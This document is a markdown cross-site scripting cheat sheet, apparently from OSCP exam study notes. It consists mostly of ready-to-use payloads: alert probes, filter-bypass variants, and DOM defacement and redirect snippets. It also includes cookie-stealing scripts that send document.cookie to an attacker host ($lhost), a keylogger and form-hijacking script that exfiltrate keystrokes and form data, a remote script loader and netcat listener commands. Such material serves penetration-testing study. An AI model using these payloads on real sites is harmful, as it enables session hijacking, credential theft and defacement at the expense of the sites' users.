# Cross-Site Scripting (XSS)

## Table of Contents

- [XSS Types](#xss-types)
  - [Reflected XSS](#reflected-xss)
  - [Stored XSS](#stored-xss)
  - [DOM-Based XSS](#dom-based-xss)
- [Basic Payloads](#basic-payloads)
- [Cookie Stealing](#cookie-stealing)
- [Keylogger](#keylogger)
- [Filter Bypass](#filter-bypass)
- [DOM Manipulation](#dom-manipulation)

---

## XSS Types

### Reflected XSS

- Payload is included in the request and reflected in the response
- Not persistent, requires victim to click malicious link

### Stored XSS

- Payload is stored on the server (database, comments, etc.)
- Persistent, affects all users who view the content

### DOM-Based XSS

- Payload is executed via client-side JavaScript
- Never sent to the server

---

## Basic Payloads

```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
<script>print()</script>
```

### HTML Tag Based

```html
<img src=x onerror=alert('XSS')>
<img src="" onerror=alert(window.origin)>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### Event Handlers

```html
<div onmouseover="alert('XSS')">Hover me</div>
<a href="#" onclick="alert('XSS')">Click me</a>
<form action="javascript:alert('XSS')"><input type=submit>
```

### Without Parentheses

```html
<script>alert`XSS`</script>
<img src=x onerror=alert`XSS`>
```

### Plaintext Tag

```html
<plaintext>
```

---

## Cookie Stealing

### Basic Cookie Grabber

```html
<script>fetch('http://$lhost/?cookie=' + document.cookie);</script>
<script>new Image().src="http://$lhost/?c="+document.cookie;</script>
<script>document.location='http://$lhost/?c='+document.cookie;</script>
```

### Base64 Encoded

```html
<script>fetch('http://$lhost/?cookie=' + btoa(document.cookie));</script>
```

### Image Tag

```html
<img src=x onerror="this.src='http://$lhost/?c='+document.cookie">
```

### Setup Listener

```shell
python3 -m http.server 80
nc -lvnp 80
```

---

## Keylogger

### Basic Keylogger

```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://$lhost/log?key=' + e.key);
}
</script>
```

### Form Hijacking

```javascript
<script>
document.forms[0].onsubmit = function() {
    fetch('http://$lhost/log?data=' + btoa(new FormData(this)));
}
</script>
```

---

## Filter Bypass

### Case Variation

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<sCrIpT>alert(1)</ScRipt>
```

### Encoding

```html
<!-- URL Encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- HTML Entity Encoding -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Unicode Encoding -->
<script>\u0061lert('XSS')</script>
```

### Breaking Tags

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<<script>script>alert('XSS')</script>
```

### Without Script Tags

```html
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body/onload=alert('XSS')>
```

### JavaScript Protocol

```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
<form action="javascript:alert('XSS')">
```

### Data Protocol

```html
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
<object data="data:text/html,<script>alert('XSS')</script>">
```

### SVG

```html
<svg><script>alert('XSS')</script></svg>
<svg onload="alert('XSS')">
<svg><image href="x" onerror="alert('XSS')"/></svg>
```

### Null Bytes

```html
<scri%00pt>alert('XSS')</script>
```

---

## DOM Manipulation

### Change Background

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://example.com/image.svg"</script>
```

### Change Title

```html
<script>document.title = 'Hacked'</script>
```

### Replace Body Content

```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'Hacked!'</script>
<script>document.body.innerHTML = '<h1>Hacked!</h1>'</script>
```

### Remove Elements

```html
<script>document.getElementById('login-form').remove();</script>
<script>document.querySelector('.password').remove();</script>
```

### Redirect

```html
<script>window.location = 'http://$lhost/'</script>
<script>document.location.href = 'http://$lhost/'</script>
```

### Load External Script

```html
<script src="http://$lhost/script.js"></script>
```

---

## Payload Cheat Sheet

| Payload | Description |
| :--- | :--- |
| `<script>alert('XSS')</script>` | Basic XSS |
| `<img src=x onerror=alert('XSS')>` | Image error handler |
| `<svg onload=alert('XSS')>` | SVG onload |
| `javascript:alert('XSS')` | JavaScript protocol |
| `<script>fetch('url?c='+document.cookie)</script>` | Cookie stealing |
| `<plaintext>` | Break page rendering |
| `<script>document.location='url'</script>` | Redirect |

---

## ðŸ“š See Also

### Related Web Attacks

- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Reconnaissance and vulnerability discovery
- **[CSRF](7.11.CSRF.md)** - Cross-Site Request Forgery (often combined with XSS)
- **[SQL Injection](7.1.SQL-Injection.md)** - Database attacks

### Defensive & Testing

- **[OSCP Exam Guide](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** - Exam methodology
